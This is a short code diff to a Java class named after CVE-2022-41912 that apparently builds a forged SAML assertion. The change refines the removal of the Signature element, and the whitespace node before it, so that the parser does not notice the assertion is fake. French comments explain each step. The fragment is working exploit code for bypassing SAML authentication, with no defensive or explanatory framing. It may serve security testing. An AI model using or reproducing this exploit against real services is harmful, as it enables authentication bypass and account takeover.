@@ -47,11 +47,24 @@ public class CVE_2022_41912 {
         response.appendChild(maliciousAssertion);
 
         // finally we have to remove to signature so the parser will not see that its fake
+        // --- SUPPRESSION PROPRE DE LA SIGNATURE ET DES ESPACES ---
         NodeList children = maliciousAssertion.getChildNodes();
         for (int i = 0; i < children.getLength(); i++) {
             Node child = children.item(i);
-            if ("Signature".equals(child.getLocalName())) {
+
+            // On cherche l'élément Signature
+            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {
+
+                // 1. Identifier et supprimer le nœud de texte (espace/indentation) JUSTE AVANT la signature
+                Node prev = child.getPreviousSibling();
+                if (prev != null && prev.getNodeType() == Node.TEXT_NODE && prev.getTextContent().trim().isEmpty()) {
+                    maliciousAssertion.removeChild(prev);
+                }
+
+                // 2. Supprimer la signature elle-même
                 maliciousAssertion.removeChild(child);
+
+                // On arrête la boucle car on a trouvé et tué la cible
                 break;
             }
         }
